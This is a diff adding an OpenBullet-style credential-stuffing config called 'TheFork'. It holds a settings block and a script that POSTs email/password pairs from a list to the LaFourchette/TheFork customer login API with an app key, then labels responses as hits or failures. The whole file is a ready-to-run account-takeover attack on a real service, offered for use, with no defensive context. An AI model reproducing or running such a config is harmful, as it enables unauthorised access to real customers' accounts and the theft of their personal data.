@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "TheFork",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-28T19:00:05.3962048+02:00",
+  "AdditionalInfo": "",
+  "Author": "AlexTheDane",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "api.lafourchette.com/api?method=customer_password_connect&key=ANDROIDGIOMACRV2&sv=13.1.0&locale=en_GB" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"id_customer\":" 
+  KEYCHAIN Failure OR 
+    KEY "does not exists" 
+
